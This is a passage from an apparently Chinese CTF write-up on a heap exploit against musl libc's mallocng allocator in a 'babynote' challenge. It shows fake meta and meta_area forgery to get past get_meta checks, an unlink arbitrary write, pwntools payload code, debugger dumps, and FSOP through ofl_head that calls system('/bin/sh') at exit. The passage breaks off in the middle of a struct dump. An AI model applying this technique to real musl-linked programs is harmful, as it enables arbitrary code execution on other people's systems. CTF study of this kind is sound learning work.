<p>其中很多信息我们不需要管信息，只要知道用户的使用的slot数据在storage里面。这里提一下，group其实也可以看作是一个slot，被另一个“meta”管理，这里提到这个是因为，free meta的时候，除了会释放对应的slot，还要释放对应的group。slot的储存结构也比较有意思，他并不会像glibc的chunk那样保留过多的本slot信息，只会用四字节来保留slot与meta的关系。</p>
<p><img src="C:\Users\32644\AppData\Roaming\Typora\typora-user-images\image-20220422192430250.png" alt="image-20220422192430250"></p>
<p>1这里是用户使用的区域，2是group 的信息，包括meta</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> group*)<span class="number">0x7f6431216c30</span></span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  meta = <span class="number">0x55555730d4f0</span>, </span><br><span class="line">  active_idx = <span class="number">9</span> <span class="string">&#x27;\t&#x27;</span>, </span><br><span class="line">  pad = <span class="string">&quot;\000\000\000\000\200\000&quot;</span>, </span><br><span class="line">  storage = <span class="number">0x7f6431216c40</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后，3这，他也只想一个地址，这里你也是一个meta，与后面group的free有关。</p>
<p>slot的堆头会保留与base的偏移，以及slot在group组的编号，通过偏移找到base，也就是group的地址。</p>
<p>下面我们来说检查，要想把fake_meta释放掉，要保证meta只有一个freeadble,可以是只有1个slot，也可以是其他状况，因为这个会涉及meta的avail_mask 以及freed_mask，我建议是把freed_mask写成0，这样在free函数里的一个循环时，直接跳出，减少工作量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">	<span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">	<span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">	<span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">	assert(!(mask&amp;self));</span><br><span class="line">	<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">if</span> (!MT)</span><br><span class="line">		g-&gt;freed_mask = freed+self;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面提到的根据用户指针找到对应的meta，在free函数里被封装在get_meta()函数里，这里也是我们的第一个检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);						<span class="comment">//UNIT = 16</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一些offset，idx的设置其实有相关的计算方式，但是为了方便，我们伪造的之前，可以把利用程序做一个真实的对布局，然后直接把group，meta的结构体中的使用位的参数复制出来。这样就可以很方便的跳过检查。我们将fake伪造在一个大的堆块上，fake会根据const struct meta *meta &#x3D; base-&gt;meta;来查询到，下面我们还要伪造一个meta_area结构体，这个结构体保留了__malloc_context的secret，然后这个area是0x1000字节对齐的，const struct meta_area *area &#x3D; (void *)((uintptr_t)meta &amp; -4096);，这个跟我们的fake_meta的地址是相关联的，所以我们需要在一个0x1000字节对齐的地方布置一个fake_meta_area,主要就是把secret写进去，绕过检查。这里并不会检查meta的prev以及next是否合法，所以这里有一个任意地址的写。把prev地址+8 写为next的值。释放slot的检查基本就结束，因为我们伪造的slot的头，以及fake_meta都是真实的样子，然后还有一个关键的检查是在dequeue(unlink)之后free_group，这里会将group指针作为一个slot指针，进行free。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);					<span class="comment">//任意地址写</span></span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span>				<span class="comment">//unlink the meta</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (m-&gt;next != m) &#123;							<span class="comment">//meta is freed</span></span><br><span class="line">		m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">		<span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*phead = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是我们上面图片的3号位置。这个是group对应的meta,这里利用同样的手段伪造一个fake_meta_area以及一个meta,只需要在另外一个0x1000字节对齐的空间布置下secret，后面布置fake_meta2就可以了。因为这里的检查也主要是get_meta().最后free_meta()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">free_meta</span><span class="params">(<span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">	*m = (<span class="keyword">struct</span> meta)&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">queue</span>(&amp;ctx.free_meta_head, m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">queue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span>						</span><br><span class="line">    <span class="comment">//inser m in the front of queue,but it will not change the phead ptr </span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!m-&gt;next);</span><br><span class="line">	assert(!m-&gt;prev);</span><br><span class="line">	<span class="keyword">if</span> (*phead) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">head</span> =</span> *phead;</span><br><span class="line">		m-&gt;next = head;</span><br><span class="line">		m-&gt;prev = head-&gt;prev;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		m-&gt;prev = m-&gt;next = m;</span><br><span class="line">		*phead = m;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有什么其他检查。</p>
<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>回到题目，我们利用UAF,</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">fakebabynote = p64( <span class="number">0x29fdd0</span> +libcbase)+p64(fakemeta_addr+<span class="number">0x50</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x28</span>)+p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;i&#x27;</span>,fakebabynote)</span><br><span class="line">free(<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">add(p64(<span class="number">0x29bd00</span>+libcbase)*<span class="number">2</span>+p64(<span class="number">0x8</span>)+p64(<span class="number">0x8</span>)+p64(libcbase+<span class="number">0x29bd90</span>),fake_meta.ljust(<span class="number">0x2000</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">free(<span class="string">b&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>group里的第一个slot开始被用作存放banynote1，next指针指向0，babynotelist头插法之后删掉第一个创建的babynote，然后堆风水将slot0（原本作为babynote）作为name或者note堆块，可以写入数据，但是因为存在uaf,虽然slot0作为链表头的name或者note,但是依旧可以链表的遍历将他看成一个节点，我们还可以将其next指针写为我们kafechunk的地址，这个fakechunk其实是一个babynote的name或者note，只是伪造成了bebynote的布局，对应note之指针指向我们布局好的fakeslot</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">64</span>gx  <span class="number">0x7f22b639fc30</span></span><br><span class="line"><span class="number">0x7f22b639fc30</span>:	<span class="number">0x00005555569254f0</span>	<span class="number">0x0000ff0000000009</span></span><br><span class="line"><span class="number">0x7f22b639fc40</span>:	<span class="number">0x00007f22b639fc70</span>	<span class="number">0x00007f22b639fca0</span></span><br><span class="line"><span class="number">0x7f22b639fc50</span>:	<span class="number">0x0000000000000028</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fc60</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000ff0000000000</span>				<span class="comment">//下一次申请，这里会被改写</span></span><br><span class="line"><span class="number">0x7f22b639fc70</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fc80</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fc90</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"><span class="number">0x7f22b639fca0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fcb0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fcc0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x0009830000000000</span></span><br><span class="line"><span class="number">0x7f22b639fcd0</span>:	<span class="number">0x00007f22b639fd00</span>	<span class="number">0x00007f22b639fd30</span></span><br><span class="line"><span class="number">0x7f22b639fce0</span>:	<span class="number">0x0000000000000028</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fcf0</span>:	<span class="number">0x00007f22b639fc40</span>	<span class="number">0x000c840000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd00</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd10</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd20</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x000f850000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd30</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd40</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd50</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x0012860000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd60</span>:	<span class="number">0x00007f22b63a3e20</span>	<span class="number">0x00007f22b639fd90</span><span class="comment">//fakebabynote的地址</span></span><br><span class="line"><span class="number">0x7f22b639fd70</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fd80</span>:	<span class="number">0x00007f22b639fcd0</span>	<span class="number">0x0015870000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd90</span>:	<span class="number">0x00007f22b63a3dd0</span>	<span class="number">0x00007f22b6395070</span>		<span class="comment">//fakebabynote,0x00007f22b6395070指向我们伪造的slot</span></span><br><span class="line"><span class="number">0x7f22b639fda0</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fdb0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"><span class="number">0x7f22b639fdc0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fdd0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fde0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b639fdf0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b639fe00</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b639fe10</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b639fe20</span>:	<span class="number">0x0000555556925090</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>我们把slot申请成为name后</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">64</span>gx  <span class="number">0x7f22b639fc30</span></span><br><span class="line"><span class="number">0x7f22b639fc30</span>:	<span class="number">0x00005555569254f0</span>	<span class="number">0x0000800000000009</span></span><br><span class="line"><span class="number">0x7f22b639fc40</span>:	<span class="number">0x00007f22b639fd00</span>	<span class="number">0x00007f22b639fd00</span></span><br><span class="line"><span class="number">0x7f22b639fc50</span>:	<span class="number">0x0000000000000008</span>	<span class="number">0x0000000000000008</span></span><br><span class="line"><span class="number">0x7f22b639fc60</span>:	<span class="number">0x00007f22b639fd90</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"><span class="number">0x7f22b639fc70</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fc80</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fc90</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"><span class="number">0x7f22b639fca0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fcb0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fcc0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x0009830000000000</span></span><br><span class="line"><span class="number">0x7f22b639fcd0</span>:	<span class="number">0x00007f22b639fd00</span>	<span class="number">0x00007f22b639fd30</span></span><br><span class="line"><span class="number">0x7f22b639fce0</span>:	<span class="number">0x0000000000000028</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fcf0</span>:	<span class="number">0x00007f22b639fc40</span>	<span class="number">0x000c840000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd00</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd10</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd20</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x000f850000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd30</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd40</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd50</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x0012860000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd60</span>:	<span class="number">0x00007f22b63a3e20</span>	<span class="number">0x00007f22b639fd90</span></span><br><span class="line"><span class="number">0x7f22b639fd70</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fd80</span>:	<span class="number">0x00007f22b639fcd0</span>	<span class="number">0x0015870000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd90</span>:	<span class="number">0x00007f22b63a3dd0</span>	<span class="number">0x00007f22b6395070</span></span><br><span class="line"><span class="number">0x7f22b639fda0</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fdb0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"><span class="number">0x7f22b639fdc0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fdd0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fde0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x001b890000000000</span></span><br><span class="line"><span class="number">0x7f22b639fdf0</span>:	<span class="number">0x00007f22b639fc40</span>	<span class="number">0x00007f22b6394020</span>	<span class="comment">//babynotelist的头指针，</span></span><br><span class="line"><span class="number">0x7f22b639fe00</span>:	<span class="number">0x0000000000000028</span>	<span class="number">0x0000000000002030</span></span><br><span class="line"><span class="number">0x7f22b639fe10</span>:	<span class="number">0x00007f22b639fd60</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b639fe20</span>:	<span class="number">0x0000555556925090</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到我们可以通过b’b’(0x00007f22b63a3dd0的数据是‘b’)找到我们的fake_babynote,然后释放掉0x00007f22b6395070这个伪slot</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">18</span>gx <span class="number">0x00007f22b6395070</span><span class="number">-0x60</span></span><br><span class="line"><span class="number">0x7f22b6395010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b6395020</span>:	<span class="number">0x00007f22b63a7e20</span>	<span class="number">0x00007f22b63a2e20</span></span><br><span class="line"><span class="number">0x7f22b6395030</span>:	<span class="number">0x00007f22b6395060</span>	<span class="number">0x00000000000003fe</span></span><br><span class="line"><span class="number">0x7f22b6395040</span>:	<span class="number">0x00000000000000a9</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b6395050</span>:	<span class="number">0x00007f22b6396020</span>	<span class="number">0x0000c00000000000</span></span><br><span class="line"><span class="number">0x7f22b6395060</span>:	<span class="number">0x00007f22b6395020</span>	<span class="number">0x0000800000000009</span>			<span class="comment">//伪造的slot堆头</span></span><br><span class="line"><span class="number">0x7f22b6395070</span>:	<span class="number">0x4141414141414141</span>	<span class="number">0x0000000000000000</span>			</span><br><span class="line"><span class="number">0x7f22b6395080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b6395090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>0x7f22b6395060这个地址就是伪造的group的base地址，对应的数据就是伪造的meta地址</p>
<p><img src="C:\Users\32644\AppData\Roaming\Typora\typora-user-images\image-20220422200825484.png" alt="image-20220422200825484"></p>
<p><img src="C:\Users\32644\AppData\Roaming\Typora\typora-user-images\image-20220422200924302.png" alt="image-20220422200924302"></p>
<p>0x00007f22b63a7e20这里就是我们的目标地址-8，0x00007f22b63a2e20这个地址是我们下一个申请出来的slot的真实地址（申请0x50）mem&#x3D;&#x3D;base,</p>
<p>下面是伪造的fake_meta1以及对应的fake_meta_area1</p>
<p><img src="C:\Users\32644\AppData\Roaming\Typora\typora-user-images\image-20220422201357563.png" alt="image-20220422201357563"></p>
<p>最后是free_group时的伪造的fake_meta2和fake_meta_area</p>
<p><img src="C:\Users\32644\AppData\Roaming\Typora\typora-user-images\image-20220422201627965.png" alt="image-20220422201627965"></p>
<h4 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h4><p>我们任意地址写的，是ofl_head，类似于glibc的——IO__lisl_all,只不过则合理一般情况下是空的，利用在于exit函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FILE **__ofl_lock()</span><br><span class="line">&#123;</span><br><span class="line">	LOCK(ofl_lock);</span><br><span class="line">	<span class="keyword">return</span> &amp;ofl_head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们把ofl_head改成我们可以控制的slot的地址，就在那里伪造一个stdout，if (f-&gt;wpos !&#x3D; f-&gt;wbase) f-&gt;write(f, 0, 0);并满足这里的条件（wpos!&#x3D;wbase）write改策划给你system,而且会把fd作为参数，fd就是就会指向flags,把他写位‘&#x2F;bin&#x2F;sh\x00’</p>
<p>正常的stdout</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *<span class="built_in">stdout</span></span><br><span class="line">$<span class="number">21</span> = &#123;</span><br><span class="line">  flags = <span class="number">69</span>, </span><br><span class="line">  rpos = <span class="number">0x0</span>, </span><br><span class="line">  rend = <span class="number">0x0</span>, </span><br><span class="line">  close = <span class="number">0x7f22b61557e5</span> &lt;__stdio_close&gt;, </span><br><span class="line">  wend = <span class="number">0x0</span>, </span><br><span class="line">  wpos = <span class="number">0x0</span>, </span><br><span class="line">  mustbezero_1 = <span class="number">0x0</span>, </span><br><span class="line">  wbase = <span class="number">0x0</span>, </span><br><span class="line">  read = <span class="number">0x0</span>, </span><br><span class="line">  write = <span class="number">0x7f22b615598e</span> &lt;__stdio_write&gt;, </span><br><span class="line">  seek = <span class="number">0x7f22b615597d</span> &lt;__stdio_seek&gt;, </span><br><span class="line">  buf = <span class="number">0x7f22b63a6708</span> &lt;buf+<span class="number">8</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">  buf_size = <span class="number">0</span>, </span><br><span class="line">  prev = <span class="number">0x0</span>, </span><br><span class="line">  next = <span class="number">0x0</span>, </span><br><span class="line">  fd = <span class="number">1</span>, </span><br><span class="line">  pipe_pid = <span class="number">0</span>, </span><br><span class="line">  lockcount = <span class="number">0</span>, </span><br><span class="line">  mode = <span class="number">-1</span>, </span><br><span class="line">  lock = <span class="number">-1</span>, </span><br><span class="line">  lbf = <span class="number">-1</span>, </span><br><span class="line">  cookie = <span class="number">0x0</span>, </span><br><span class="line">  off = <span class="number">0</span>, </span><br><span class="line">  getln_buf = <span class="number">0x0</span>, </span><br><span class="line">  mustbezero_2 = <span class="number">0x0</span>, </span><br><span class="line">  shend = <span class="number">0x0</span>, </span><br><span class="line">  shlim = <span class="number">0</span>, </span><br><span class="line">  shcnt = <span class="number">0</span>, </span><br><span class="line">  prev_locked = <span class="number">0x0</span>, </span><br><span class="line">  next_locked = <span class="number">0x0</span>, </span><br><span class="line">  locale = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面是伪造的stdout</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p * (FILE * <span class="type">const</span>)<span class="number">0x7fc49ff72e20</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  flags = <span class="number">1852400175</span>, </span><br><span class="line">  rpos = <span class="number">0x0</span>, </span><br><span class="line">  rend = <span class="number">0x0</span>, </span><br><span class="line">  close = <span class="number">0x0</span>, </span><br><span class="line">  wend = <span class="number">0x0</span>, </span><br><span class="line">  wpos = <span class="number">0x0</span>, </span><br><span class="line">  mustbezero_1 = <span class="number">0x0</span>, </span><br><span class="line">  wbase = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;, </span><br><span class="line">  read = <span class="number">0x1</span>, </span><br><span class="line">  write = <span class="number">0x7fc49fd1b963</span> &lt;system&gt;, </span><br><span class="line">  seek = <span class="number">0x7fc49fd1b963</span> &lt;system&gt;, </span><br><span class="line">  buf = <span class="number">0x0</span>, 